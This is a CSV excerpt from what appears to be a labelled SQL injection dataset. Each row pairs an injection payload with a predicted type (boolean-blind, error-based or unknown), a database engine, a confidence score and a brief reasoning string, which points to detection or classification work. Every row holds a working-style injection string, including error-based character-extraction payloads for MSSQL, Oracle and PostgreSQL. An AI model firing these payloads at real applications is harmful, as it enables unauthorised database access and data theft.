id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39944,"select * from users WHERE username = ""-5863"" or username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39945,-4610\' ) ) and ( ( \'hdco\' = \'hdco,unknown,generic,0.50,Insufficient data to classify payload type,1
39946,"select * from users WHERE username = ""1"" and username = ""-1254"" or username = ""-9688%\' ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39947,1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi,error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39948,1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\',error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39949,"select * from users WHERE username = ""1 or username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39950,"select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 or username = ""-6523"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39951,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39952,"select * from users WHERE username = ""1\' ) ) ) and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-9564",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39953,-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39954,-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg,unknown,generic,0.50,Insufficient data to classify payload type,1
39955,"select * from users WHERE username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-6523"" and username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39956,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" and username = ""1%\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39957,1\' ) ) and ( ( \'ajka\' = \'ajka,unknown,generic,0.50,Insufficient data to classify payload type,1
39958,"1%\' ) ) and ( ( \'%\' = \'"" or username = ""1\' ) ) and ( ( \'opyp\' = \'opyp",unknown,generic,0.50,Insufficient data to classify payload type,1
39959,"SELECT * FROM users WHERE usErnamE = ""1\' ) ) as plbt whErE 4368 = 4368 OR username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39960,"1\' ) ) ) or username = ""1%"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39961,"select * from users WHERE username = ""-1254"" or username = ""-7209\' ) ) ) and username = ""-4582 ) ) as gvfo where 8885 = 8885",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39962,"select * from users WHERE username = ""1"" and username = ""-1641\' ) ) or username = ""-2733\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
